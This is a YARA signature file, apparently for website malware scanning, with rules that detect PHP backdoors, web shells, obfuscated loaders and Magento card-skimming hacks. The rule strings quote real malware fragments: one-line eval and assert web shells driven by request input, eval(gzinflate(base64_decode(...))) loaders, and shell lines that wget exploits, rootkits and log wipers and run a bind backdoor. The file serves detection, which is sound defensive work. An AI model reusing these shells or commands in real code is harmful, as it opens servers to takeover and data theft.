import "hash"
rule Magento_shoplift_hack3
{
		meta:
			description = "finds magecard hack for Magento"
		strings:
			$s1 = "magecard.xyz"
		condition:
			$s1

}
rule Magento_shoplift_hack2
{
		meta:
			author = "martys"
			description = "locates suspicious function usually in app/code/core/Mage/Cms/controllers/IndexController.php"
		strings:
			$hack = "Mage_Cms_Auth_"
		condition:
			$hack

}
rule PHP_malware_svchost
{
	strings:
		$s0 = "svchost.exe" fullword ascii
	condition:
		$s0

}
rule Magento_soulmagic_cchack
{
	meta:
			author = "martys"
			description = "soulmagic cc.php hacks"
	strings:
		$url="soulmagic.biz"
		$url2="soulmagic"
		$url3="java-e-shop.com"
		$url4="fozzy.com"
	condition:
		$url or $url2 or $url3 or $url4

}
rule Perl_conspy_hack
{
		meta:
		description="perl script that grabs conf files and other data to find exploits"
		strings:
			$1="copral"
			//$2="confspy.log"
			//$3="c0li.m0de.0n"
			//$4="usr/bin/perl"
			//$5="etc/passwd"
		condition:
			$1

}
rule Magento_shoplift_hack
{
		meta:
			author = "martys"
			description = "possible customer login registration hack"
		strings:
			$1="Mag Log1n"
		condition:
			any of them

}
rule Malware_host_ddos
{
			meta:
			author = "martys"
			description = "ddos using /usr/bin/host"
			strings:
			$1="/usr/bin/host"
			condition:
			any of them

}
rule PHP_backdoor10
{
		meta:
			author = "martys"
			description = "backdoor file editor?"
		strings:
			$1="L2hvbWUveXVtaS9wdWJsaWNfaHRtbC9tZWRpYS9jYXRhbG9nL3Byb2R1Y3QvYi84L2I4YTRmNmQyLWY0OWQtNDA5OC04OTFjLWQ3NDNiOTQyZmVlMy5qcGc="
			$2="@touch($ajax,1325548800,1325548800)"
		condition:
			any of them

}
rule PHP_backdoor7
{
		strings:
                         $1="function p($bkdbrqyvb, $ylzhxco){$lqqqqudl"
		condition:
			any of them

}
rule PHP_backdoor6
{
		meta:
			author = "martys"
			description ="some garbage code"
		strings:
			$1 = "x69x66x28x21x66x75x6ex63x74x69x6fx6ex5fx65x78x69x73x74x73x28x22xa0x22x29x29x7bx66x75x6ex63x74x69x6fx6ex20xa0x28x29x7bx24xa0x3dx73x74x72x5fx72x65x70x6cx61x63x65x28x61x72x72x61x79x28x27x23x73x21x73x23x27x2cx27x23x65x21x65x23x27x2cx27x23x30x21x30x23x27x29x2cx61x72x72x61x79x28x27x3cx27x2cx27x3ex27x2cx22x5cx30x22x29x2cx6fx62x5fx67x65x74x5fx63x6cx65x61x6ex28x29x29x3bx66x6fx72x28x24xa0xa0x3dx31x2cx24xa0xa0xa0x3dx6fx72x64x28x24xa0x5bx30x5dx29x3bx24xa0xa0x3cx73x74x72x6cx65x6ex28x24xa0x29x3bx24xa0xa0x2bx2bx29x24xa0x5bx24xa0xa0x5dx3dx63x68x72x28x6fx72x64x28x24xa0x5bx24xa0xa0x5dx29x2dx24xa0xa0xa0x2dx24xa0xa0x29x3bx24xa0x5bx30x5dx3dx27x20x27x3bx72x65x74x75x72x6ex20x24xa0x3bx7dx7d" ascii
		condition:
			any of them

}
rule PHP_backdoor5
{
		meta:
			author = "martys"
			description ="some garbage code from list.php"
		strings:
			$1 = "$xuew = Array("
			$2 = "eval(mn($rq, $xuew));"
		condition:
			any of them

}
rule Magento_onepage_php_hack2
{
		meta:
			author = "martys"
			description = "gzinflate junk in Onepage.php"
		strings:
			$1 = "=8k/9WnepdriVNcWD8UydY2Y2TWzq1KDWNm6Qj2SUMefJHh3ps4SVoU/HoAHF+ZYkak/isGyl/ndcG7ZRAgHgsl2zXD3nCfySH5iGPzIYJGeCf7vxVfIElR1eivIx8Yzm3I+A8rgoq1M9nV9+wzKB1r+7xXi2nTaxtlcZ/j5MtTGLpmep1fU9EZ626oNnJi5xEI0ksi03i8qgAp9SedXj9sOmDYC9dgrC/2ZL4PF4iGglOSRyF4wpo+ygMeBYWUow8ZjTOIVMPGXtpvJD5dnHwHYY54PK4nTCyPFCq2HmWjq+8cbqUClxcxyTakEUTod5a4EiUHYNrBauNqW5Whes8gnUEENvTFIdYWtAkv4wpYtx9Hs0QT8xs/BuG7s9WuL8G8QghUJ0QTjlLWzzvkrpvcKlBDl07WiXU2vpGJ66WqTf2UxUAYCHwCncC6UAGPue2oQY4LDVTdFmsfJQRlTFuMFvLl+ao7FUuiLOOuMS4TiHfeZrPhgYcIMpL1Y2XRsndiYdcMeNSEsDSo0WtCXSSbBYIQPxAy+RysQHghyKEacufCIBnUdLcnAuJqI50g1NzDE5ZneqD9p0DSnpCXKyk76uiZEuM2A1HdUd1cfJ9x+nf/GdazAGJzieOMdP99tIbHPPfD3Pps2MQJte8SjY8jgHWm4SfeOZxSQPziPbZ8UXMLB/+Vab5SltgPFspKsAZF1ODOhZtC4wgHZEsafojXAbAgrMyPZKv0QOf0DiL2Mmjc+QmFwRhWzPbi733sIvSD3grafLyN7nufxsbzNN2JIoNLyEDu+DdzQYgTIPS7Kz0URNcgoooIa"
			$2 = "eval(gzinflate(base64_decode(str_rot13(strrev("
		condition:
			any of them

}
rule Potential_Malware_gzinflates
{
		meta:
			author = "martys"
			description = "gzinflate junk in Onepage.php"
		strings:
			$2 = "eval(gzinflate(base64_decode(str_rot13(strrev("
		condition:
			any of them

}
rule Magento_onepage_php_hack
{
			meta:
			author = "martys"
			description = "gzinflate junk in Onepage.php"
			strings:
				$1 = "if(md5(@$_COOKIE["
			condition:
				any of them

}
rule PHP_backdoor4
{
		strings:
			$1="$s98b0504="
		condition:
			any of them

}
rule PHP_backdoor3
{
    strings:
        $ = "chk_jschl"
        $ = "jschl_vc"
        $ = "jschl_answer"
    condition:
        2 of them // Better be safe than sorry

}
rule Potential_Malware_Bad_Websites
{
    strings:
        $ = "1337day.com"
        $ = "altervista.org"
        $ = "antichat.ru"
        $ = "ccteam.ru"
        $ = "crackfor" nocase
        $ = "darkc0de" nocase
        $ = "egyspider.eu"
        $ = "exploit-db.com"
        $ = "hashchecker.com"
        $ = "hashkiller.com" nocase
        $ = "md5crack.com"
        $ = "md5decrypter.com"
        $ = "milw0rm.com"
        $ = "packetstormsecurity" nocase
        $ = "rapid7.com"
        $ = "visvo.com"

    condition:
        any of them

}
rule YarGen_php_backdoor22
{
	meta:
		description = "Auto-generated rule - file _install.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-23"
		hash = "05992110a3eec5a7af08f5db280be65d9aa3d96e3633777bb91bf42f9d5394e7"
	strings:
		$s0 = "$YiunIUY76bBhuhNYIO9 = \"ZXZhbChldmFsKCJceDcyXHg2NVx4NzRceDc1XHg3Mlx4NmVceDIwXHg3M1x4NzRceDcyXHg3Mlx4NjVceDc2XHgyOFx4NjJceDYxXHg" ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 139KB and all of them
}
rule YarGen_php_backdoor21
{
	meta:
		description = "Auto-generated rule - file skins.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-23"
		hash = "501d9df6c214133bf43e691ba2b70b397307861bb468a14e058784bef5b75d65"
	strings:
		$s0 = "<?php if(@$_COOKIE[qz]) ($_=@$_REQUEST[q]).@$_($_REQUEST[z]); ?>" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 1KB and all of them

}
rule YarGen_php_backdoor20
{
	meta:
		description = "Auto-generated rule - file shrr.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-23"
		hash = "5e8a1ddde920418879aa3776cba8dff2e30acc0484d22ce35ce18b619cd9888c"
	strings:
		$s0 = "ttytty(477);wsoSecParam(ttytty(478),wsoEx(ttytty(479)));wsoSecParam(ttytty(480),@file_get_contents(ttytty(481)));echo /*  */" fullword ascii
		$s1 = "round(0+1+1)){$temp=@file($_POST[ttytty(1137)]);if(is_array($temp))foreach($temp /* categories = get_terms( taxonomy, r ); */" fullword ascii
		$s2 = "ttytty(470);$temp=array();foreach($userful /* if(empty(categories) && ! r[hide_if_empty] && !empty(show_option_none)){ */" fullword ascii
		$s3 = "ttytty(1058) .$temp .ttytty(1059);echo /* categories = get_the_category( post_id );if(empty( categories)) */" fullword ascii
		$s4 = "ttytty(162) .$_POST[ttytty(163)] .ttytty(164) .$_SERVER[ttytty(165)] .ttytty(166) .WSO_VERSION .\"</title>" fullword ascii
		$s5 = "date(ttytty(644),@filemtime($GLOBALS[ttytty(645)] .$dirContent[$i])),ttytty(646)=> /* class = esc_attr( class ); */" fullword ascii
		$s6 = "$gid=@posix_getgrgid(@filegroup($_POST[ttytty(892)]));echo /* selected =(-1 === strval(r[selected]))?  selected=selected : ; */" fullword ascii
		$s7 = "dump($table,$fp=false){switch($this->type){case /* selected =(0 === strval(r[selected]))?  selected=selected : ; */" fullword ascii
		$s8 = "ttytty(884);if(!file_exists(@$_POST[ttytty(885)])){echo /* selected =(0 === strval(r[selected]))?  selected=selected : ; */" fullword ascii
		$s9 = "ttytty(1371);if(!empty($_POST[ttytty(1372)])){$db->selectdb($_POST[ttytty(1373)]);echo /* if((int) tab_index > 0 ) */" fullword ascii
		$s10 = "ttytty(748) .date(ttytty(749)) .ttytty(750) .($_COOKIE[ttytty(751)]== /* if((int) tab_index > 0 ) */" fullword ascii
		$s11 = "$GLOBALS[ttytty(642)] .$dirContent[$i],ttytty(643)=> /* categories = get_terms( taxonomy, r ); */" fullword ascii
		$s12 = "$f)@rename($_COOKIE[ttytty(584)] .$f,$GLOBALS[ttytty(585)] .$f);}elseif($_COOKIE[ttytty(586)]== /* if(show_option_none){ */" fullword ascii
		$s13 = "ttytty(1102);if($_POST[ttytty(1103)]!= /* selected =(0 === strval(r[selected]))?  selected=selected : ; */" fullword ascii
		$s14 = "ttytty(407)){wsoSecParam(ttytty(408),@is_readable(ttytty(409))?ttytty(410):ttytty(411));wsoSecParam(ttytty(412),@is_readable(tty" ascii
		$s15 = "ttytty(1432))&&!empty($_POST[ttytty(1433)])){$db->query(@$_POST[ttytty(1434)]);if($db->res /*  */" fullword ascii
		$s16 = "ttytty(745))||($_COOKIE[ttytty(746)]== /* defaults[selected] =(is_category())? get_query_var( cat): 0; */" fullword ascii
		$s17 = "dump_columns($table,$columns,$fp=false){switch($this->type){case /* if((int) tab_index > 0 ) */" fullword ascii
		$s18 = "$dirContent[$i],ttytty(641)=> /* if((int) tab_index > 0 ) */" fullword ascii
		$s19 = "function_exists(ttytty(1510) .$_POST[ttytty(1511)]))call_user_func(ttytty(1512) .$_POST[ttytty(1513)]);exit;" fullword ascii
		$s20 = "readlink($tmp[ttytty(663)])));elseif(@is_dir($GLOBALS[ttytty(664)] .$dirContent[$i]))$dirs[]=array_merge($tmp,array(ttytty(665)=" ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 426KB and all of them
}
rule YarGen_php_backdoor19
{
	meta:
		description = "Auto-generated rule - file favicon.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-23"
		hash = "8f7e8d2b705c875a5e043909c8192c8afc0a4b3d4f83008c3e28f7d353322345"
	strings:
		$s0 = "$idc = \"=Ew/P7//fvf/e20P17/LpI7L34PwCabTrwvXJbPWN3TV+/T/mE3R5//n3zfJlHOEt/33HXCPomvNr8X9Of74N/C8u0KblTAt8+AAh3gjnKzeZWDyELiXuc/" ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 75KB and all of them
}
rule YarGen_paypal_phish2
{
	meta:
		description = "Auto-generated rule - file ipays.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-23"
		hash = "b3a969bdb74a62a96d4c3ca35733fd21ad6274f6bbf07398189a9203bf634b73"
	strings:
		$s0 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\");}" fullword ascii
		$s1 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";" fullword ascii
		$s2 = "function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh) {" fullword ascii
		$s3 = "displaysecinfo(\"Kernel Version\",myshellexec(\"sysctl -a | grep version\"));" fullword ascii
		$s4 = "array(\"wget Sudo Exploit\",\"wget http://www.securityfocus.com/data/vulnerabilities/exploits/sudo-exploit.c\")," fullword ascii
		$s5 = "exit(\"<a href=\\\"$sh_mainurl\\\">$sh_name</a>: Access Denied - Your host (\".getenv(\"REMOTE_ADDR\").\") not allowed\");" fullword ascii
		$s6 = "<input type=hidden name=\"cmd_txt\" value=\"1\"> - <input type=submit name=submit value=\"Execute\">" fullword ascii
		$s7 = "array(\"wget & extract EggDrop\",\"wget \".$sh_mainurl.\"httpd.tar.gz;tar -zxf httpd.tar.gz\")," fullword ascii
		$s8 = "\"Your IP : <a href=http://whois.domaintools.com/\".$_SERVER[\"REMOTE_ADDR\"].\">\".$_SERVER[\"REMOTE_ADDR\"].\"</a><br>\";" fullword ascii
		$s9 = "array(\"wget & run BindDoor\",\"wget \".$sh_mainurl.\"tool/bind.tar.gz;tar -zxvf bind.tar.gz;./4877\")," fullword ascii
		$s10 = "# MySQL version: (\".mysql_get_server_info().\") running on \".getenv(\"SERVER_ADDR\").\" (\".getenv(\"SERVER_NAME\").\")\".\"" fullword ascii
		$s11 = "$logfile = $tmpdir_logs.\"yx29sh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
		$s12 = "echo \"<form method=\\\"GET\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" name=" ascii
		$s13 = "array(\"wget RatHole 1.2 (Linux & BSD)\",\"wget http://packetstormsecurity.org/UNIX/penetration/rootkits/rathole-1.2.tar.gz\")," fullword ascii
		$s14 = "echo \"<br><br><input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Dump\\\"><br><br><b><sup>1</sup></b> - all, if empty\";" fullword ascii
		$s15 = "$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;" fullword ascii
		$s16 = "array(\"wget WIPELOGS PT1\",\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\")," fullword ascii
		$s17 = "array(\"Md5-Lookup\",\"http://darkc0de.com/database/md5lookup.html\")," fullword ascii
		$s18 = "$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;" fullword ascii
		$s19 = "\"<td width=50%><p>Server IP : <a href=http://whois.domaintools.com/\".gethostbyname($_SERVER[\"HTTP_HOST\"]).\">\".gethostbynam" ascii
		$s20 = "$millink=\"http://milw0rm.com/search.php?dong=Linux Kernel \".$Lversion;" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 587KB and all of them
}
rule YarGen_php_backdoor18
{
	meta:
		description = "Auto-generated rule - file ajax17.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-23"
		hash = "e5c2991d5876872d36719b476e2506d32a4b1ae2f6e72b227fd4186e99a970e4"
	strings:
		$s0 = "@$GLOBALS[$GLOBALS['l58848089'][68].$GLOBALS['l58848089'][24].$GLOBALS['l58848089'][7].$GLOBALS['l58848089'][22]](0);" fullword ascii
		$s1 = "elseif ($wc7594339[$GLOBALS['l58848089'][12]] == $GLOBALS['l58848089'][50])" fullword ascii
		$s2 = "if ($wc7594339[$GLOBALS['l58848089'][12]] == $GLOBALS['l58848089'][14])" fullword ascii
		$s3 = "$GLOBALS[$GLOBALS['l58848089'][3].$GLOBALS['l58848089'][49].$GLOBALS['l58848089'][70].$GLOBALS['l58848089'][73].$GLOBALS['l58848" ascii
		$s4 = "function y7429865($wc7594339, $sd46bfef)" fullword ascii
		$s5 = "eval($wc7594339[$GLOBALS['l58848089'][78]]);" fullword ascii
		$s6 = "$GLOBALS[$GLOBALS['l58848089'][68].$GLOBALS['l58848089'][24].$GLOBALS['l58848089'][77].$GLOBALS['l58848089'][50].$GLOBALS['l5884" ascii
		$s7 = "function fa33772($wc7594339, $sd46bfef)" fullword ascii
		$s8 = "$wc7594339 = $j2633b89b;" fullword ascii
		$s9 = "$g66118b = Array(" fullword ascii
		$s10 = "$kface510 = NULL;" fullword ascii
		$s11 = "$kface510 = $sd46bfef;" fullword ascii
		$s12 = "$wc7594339 = NULL;" fullword ascii
		$s13 = "$g92d725 = \"\";" fullword ascii
		$s14 = "global $w5e7a42;" fullword ascii
		$s15 = "if (!$wc7594339)" fullword ascii
		$s16 = "return $g92d725;" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 42KB and all of them
}
rule YarGen_php_backdoor17
{
	meta:
		description = "Auto-generated rule - file lib.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-23"
		hash = "e398270203deab8f6dc1d4a3b6766113f567bc93ef46e105c3e71eafac3ab0d5"
	strings:
		$s0 = "<?php                                                                           " fullword ascii
		$s1 = "$p18=\">~Uoq<x.#eJ=HI7pZ0Y3nK@OMr{[R`T&/GyPX\\tc 1wE\\n+'}^*vL:2a\\rBkm%s9-_]\\\"Ad\\\\Ch;6?4gV5Dzt,iu8Q\\$WNjb)|f(S!Fl\"; $GLOB" ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 189KB and all of them
}
rule YarGen_php_backdoor16
{
	meta:
		description = "Auto-generated rule - file session.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-23"
		hash = "ba688769b6ba37ddc7b2f23d662c5d970de331c2b3cf421d2d92a6033c21f115"
	strings:
		$s0 = "$i45=\"gGatAE\\tf Z{V)x+L9eb&>ohmdz%RBn4N@\\rlFj1.ys#W*J[v86CMX}?'D2q]S7IUki0=Q(<O/u_w,r~-`p\\n5\\$\\\\K3;T!H^Y|:\\\"cP\"; $GLOB" ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 188KB and all of them
}
rule YarGen_php_backdoor15
{
	meta:
		description = "Auto-generated rule - file frontend.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-23"
		hash = "e5b7ff2839fee50529aa7f1901afa09f5e8eeaa1efe8780178c16b824ade1e62"
	strings:
		$s0 = "kr';$___=isset($_POST['___'])?$_POST['___']:(isset($_COOKIE['___'])?$_COOKIE['___']:NULL);if($___!==NULL){$___=md5($___).substr(" ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 46KB and all of them
}
rule YarGen_php_backdoor14
{
	meta:
		description = "Auto-generated rule - file xmlrpc.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-23"
		hash = "b1ae51cd5110453630f0fd14b08dfa17408f967ca340c91706c9d3fad8adc507"
	strings:
		$s0 = "$code = \"7b3peuO4sQD6P9+Xd2AzzrQ9lkVJlve2Z7Tasq3d8tbd16FESqK1UCapNafvs98qACTBRYs9PTnJuZlkxiKWQgEoFAqFQtVvF19+G3VHf/2L9Ovm/0hYXP" ascii
		$s1 = "@error_reporting(0);" fullword ascii
		$s2 = "// no malware on this code, you can check it by yourself ;-)" fullword ascii
		$s3 = "@eval(gzinflate(base64_decode($code)));" fullword ascii
		$s4 = "@set_time_limit(0); " fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 183KB and all of them
}
rule YarGen_php_backdoor13
{
	meta:
		description = "Auto-generated rule - file options.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-23"
		hash = "4bfc9610a3ba49a2ed79e0952d0221fe2b7c013f57787efc9801d4ea4c9ab8c5"
	strings:
		$s0 = "<?php $cookey = \"a4eb8c7f1c\"; preg_replace(\"\\x23\\50\\x2e\\53\\x29\\43\\x69\\145\",\"\\x40\\145\\x76\\141\\x6c\\50\\x22\\134" ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 2KB and all of them
}
rule YarGen_php_backdoor12
{
	meta:
		description = "Auto-generated rule - file unint.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-23"
		hash = "42a4ca6aac30a2cefd5507ddd22c4ef8af85106a61ea3cb25e248e3e55db4b56"
	strings:
		$s0 = "if(isset($_POST['shauid'])){ $uidmail = base64_decode($_POST['shauid']); eval($uidmail); }" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 1KB and all of them
}
rule YarGen_php_backdoor10
{
	meta:
		description = "Auto-generated rule - file ea.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-23"
		hash = "b1a3ef7be8a6773e60d0b934ba9b13cadaf2a01810f93c85b483f966d06a63c6"
	strings:
		$s0 = "<?php ${\"\\x47\\x4c\\x4f\\x42A\\x4c\\x53\"}[\"\\x6b\\x64\\x71\\x79\\x65e\"]=\"\\x76\\x61lue\";${\"\\x47\\x4c\\x4f\\x42\\x41L\\x" ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 13KB and all of them
}
rule YarGen_php_backdoor9
{
	meta:
		description = "Auto-generated rule - file test.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-23"
		hash = "e374927579a0c832aa6b865796112dbd618d879bd9e8003ab65c33cb917957e4"
	strings:
		$s0 = "error_reporting(E_ALL); ?>" fullword ascii
		$s1 = "assert(stripslashes($_REQUEST[q]));" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 1KB and all of them

}
rule YarGen_php_backdoor8
{
	meta:
		description = "Auto-generated rule - file install.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-23"
		hash = "c020f43c76c8953d08cc2160e94c764c45dc4d42c4583ff7bfebb2440b626e40"
	strings:
		$s0 = "<?php eval(stripslashes($_REQUEST[q]));?>" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 1KB and all of them

}
rule YarGen_php_backdoor7
{
	meta:
		description = "Auto-generated rule - file 202.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-23"
		hash = "137ec03babf8fad6f19e0eb5bba0a27a3c40f3ba7b0dd32abf8c54400d29cc61"
	strings:
		$s0 = "<form enctype=\"multipart/form-data\" action=\"\" method=\"POST\">Message : <input size=\"20\" name=\"uploadedfile\" type=\"file" ascii
	condition:
		uint16(0) == 0x663c and filesize < 1KB and all of them
}
rule YarGen_php_backdoor6
{
	meta:
		description = "Auto-generated rule - file info.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-23"
		hash = "1c66d79e8f02047f0cf3afd213a7b23fa3ab531d10899b7e3674a3f27e1b6c0e"
	strings:
		$s0 = "lHD/IJ0Oceapol0Lwh7fwpnXaA2qqhojfZwZr4kGTB/crGTUBEFtpYGXgJtqoRtujbz+tZx0YG9e6QgL" fullword ascii
		$s1 = "7eMqDnc5irRYz8123oo6vR5mH/H7j70GHTCmZmiboi5A4XeC+KKyKz3iRCxPrGz8bzQT7JEeJdZO2oTh" fullword ascii
		$s2 = "oqpL9MkwR9dq+Ud57RxgWczdkh+vL23vF+vPyaP5UcSgETez39RZrmvlVW/+64kdlM1H0XnxPxtiFHm1" fullword ascii
		$s3 = "q+gXujELGUpH+XGuJDlLpCKe2Nh755bxbZevpXJdn3801RovTF4kV9lva93J9FQVytpwqV0wzaXZz3HS" fullword ascii
		$s4 = "f9dn5xwdisLqIr2iN0KzotsdQ7xCX8Mot0bODGetBOBVpGntPmI1TDmpqo7xCJLUyPKUIPvPLGQWTBTc" fullword ascii
		$s5 = "8OTxnLdOgQL5yloG2+m4tfg3UknoYmb0Yt2ybPCKyLpN+G1bOiOF114O3W5Ei9TZllCPi5Jn5t8iUau2" fullword ascii
		$s6 = "XqV3ZLXGCmdkR1UZa5P7xM4Y1J42fQwaq3pbXkZeEgdURLXzEtpLSe6ec901L2GzHQvXSwHcDHkLx3zd" fullword ascii
		$s7 = "rzCTOOiW6G3BZV7orAalMAX7w6P09sEVoNpr//jRDbOT/4zzoEsWjHDyBXbPwsBZgx8FH14QAhWA4Uta" fullword ascii
		$s8 = "pzVSvCPRQV2mWL//cza/4GiikTsDTvPdOD7oupIbMhETuJcy3eBOzKJDIapKjixSiVCklOPauR6fUWgD" fullword ascii
		$s9 = "Ya+3sDRPozT5Ig2Ek6U3ZOX9aG1x71woX6l3ACcMvIpZerstD//mpD0ZDH8qHwoOETbRigFWU8gUWVwJ" fullword ascii
		$s10 = "1/RwvFJ3kWpWHNfOx7ymjum2v0iDacPO1cfV2vCSpTW8ypod4RlQMASHqMmjCedbpPh6Y0ecwM/wkr9J" fullword ascii
		$s11 = "+/jE0x+pwKySVUyJv9RV78aQINiSNsanjX9KTdGutUeZgk8+MC106pX6L1TpZTkSqFfik3STjFHwG9k1" fullword ascii
		$s12 = "DwwbBSaP05P/oJyOy/eqUV/YHhQBLF3CvH7d8G9HmOPGWN+ZCqExFxy70714+8wcYzAAa6bjwx4m8P/C" fullword ascii
		$s13 = "yED7eaAXnWlr/EDrlu4hc40rAibwWl69xFaC87CUvDiYYPPrcxOPi8nRRyyosRcvAIXkX7aW4lhEMo/p" fullword ascii
		$s14 = "Rt/565lnoS3BtrDZMjyAyM0CnKqe45R+ufx1nNYkCF8Vm/Y/yvh8xrW0NJArA56WInRzCWPADYIEX4kz" fullword ascii
		$s15 = "qhhpmPce0LDdPPlTkpI7wvNt6zqXSBv7GfZNmaI/voKFfxmMo86PDi2EDSNEoWFjrRdasW5MIQZF2z/Y" fullword ascii
		$s16 = "i/fEP2Wb3DewQjpUPW6fq2kntPNp+81PbjMYkbepNBnPc+99SrLuNrXveCJIzMIf9YITda/afbH1dz7y" fullword ascii
		$s17 = "U/pEUUaWoUhmbARo006ojTnI88KihSCtnIiAtrknq8l2S+35VYbzYu/Fu3EIW5czQKtn/+DJDGlCi7c4" fullword ascii
		$s18 = "T/TMznUA1GygA4Wtg9isIbNIAnCkD9Ev7ZN6JWPpxTiZqhevwjMZfPEiLr2O4hp/obr6oWne71qFqSK5" fullword ascii
		$s19 = "v/tdzby1vXn9ZK3W8hyQaYXwaI9O3VFmIVbrGPdK3Dzu4Py88Y36QnQjerdsZe9icwXiXXumAv1AuN6P" fullword ascii
		$s20 = "n/7UKxnaH0asT6b5L22Z8VcPyoIAs+bMOObPmghLHA/acIgvN1h2HVfb2645avSxQllAVqe5eVtYbnTe" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 62KB and all of them

}
rule YarGen_paypal_phish
{
	meta:
		description = "Auto-generated rule - from files ipays.php, ipays.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-23"
		super_rule = 1
		hash1 = "b3a969bdb74a62a96d4c3ca35733fd21ad6274f6bbf07398189a9203bf634b73"
		hash2 = "b3a969bdb74a62a96d4c3ca35733fd21ad6274f6bbf07398189a9203bf634b73"
	strings:
		$s0 = "<input type=\"hidden\" name=\"sql_login\" value=\"<?php echo htmlspecialchars($sql_login); ?>\">" fullword ascii
		$s1 = "exec(\"$cmd > /dev/null &\");" fullword ascii
		$s2 = "$encoded = base64_encode(file_get_contents($d.$f));" fullword ascii
		$s3 = "if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}" fullword ascii
		$s4 = "<input type=\"hidden\" name=\"sql_passwd\" value=\"<?php echo htmlspecialchars($sql_passwd); ?>\">" fullword ascii
		$s5 = "function myshellexec($cmd) {" fullword ascii
		$s6 = "while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo \"<tr><td>\".$row[0].\"</td><td>\".$row[1].\"</td></tr>\";}" fullword ascii
		$s7 = "$scan = myshellexec(\"ps aux\");" fullword ascii
		$s8 = "$res = @ob_get_contents();" fullword ascii
		$s9 = "$r = @file_get_contents($d.$f);" fullword ascii
		$s10 = "if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}" fullword ascii
		$s11 = "\"<table class=contents><tr><td class=barheader colspan=2>\"." fullword ascii
		$s12 = "\"<tr><td></td><td><input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Send\\\"></form></td></tr>\"." fullword ascii
		$s13 = "echo \"<option value=\\\"\".htmlspecialchars($als[1]).\"\\\">\".htmlspecialchars($als[0]).\"</option>\";" fullword ascii
		$s14 = "else {echo \"Can't create DB \\\"\".htmlspecialchars($sql_newdb).\"\\\".<br>Reason:</b> \".mysql_smarterror();}" fullword ascii
		$s15 = "if (!empty($psterr)) {echo \"<b>Pasting with errors:</b><br>\".$psterr;}" fullword ascii
		$s16 = "header(\"Content-type: application/octet-stream\");" fullword ascii
		$s17 = "echo \"<form action=\\\"\".$surl.\"\\\" method=POST>\"." fullword ascii
		$s18 = "<input type=\"hidden\" name=\"sql_db\" value=\"<?php echo htmlspecialchars($sql_db); ?>\">" fullword ascii
		$s19 = "if (empty($add_drop)) {$add_drop = TRUE;}" fullword ascii
		$s20 = "echo \"</select>&nbsp;<input type=\\\"submit\\\" value=\\\"Confirm\\\"></form></p>\";" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 587KB and all of them
}
rule YarGen_php_backdoor5
{
	meta:
		description = "Auto-generated rule - from files shrr.php, phpini.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2015-12-23"
		super_rule = 1
		hash1 = "5e8a1ddde920418879aa3776cba8dff2e30acc0484d22ce35ce18b619cd9888c"
		hash2 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
	strings:
		$s0 = "div.content{ padding: 5px;margin-left:5px;background-color:#333; }" fullword ascii
		$s1 = "input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid $color; font: 9pt Monospace,'Courier New'; }" fullword ascii
		$s2 = "h1{ border-left:5px solid $color;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }" fullword ascii
